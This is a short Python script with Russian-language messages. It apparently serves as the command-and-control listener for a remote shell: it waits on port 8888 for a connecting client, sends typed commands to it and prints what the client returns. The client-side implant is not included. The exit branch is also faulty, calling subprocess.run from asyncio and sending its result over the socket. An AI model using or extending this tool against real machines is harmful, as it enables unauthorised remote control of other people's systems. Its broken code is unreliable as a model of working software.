from asyncio import subprocess
import socket

s = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
s.listen(5)

print('[!] Server has been started...')

client, addr = s.accept()

while True:
    try:
        command = input("[-] Enter your command: ")

        if command.lower() == 'exit':
            client.send(subprocess.run('exit()'))
            client.close()
            s.close()
            print("[-] Соединение с клиентом '{}' прервано".format(addr))
            break
        elif command == '':
            print('[-] Команда не может быть пустой')
        else:
            client.send(command.encode())        
            print('[-] Команда отправлена')

            result = client.recv(4096).decode()
            print('[-] Результат выполнения: \n {}'.format(result))
    except KeyboardInterrupt:
        client.close()
        s.close()
        print('[-] Соединение прервано пользователем...')
        break

print('[-] Соединение разорвано')
client.close()
s.close()
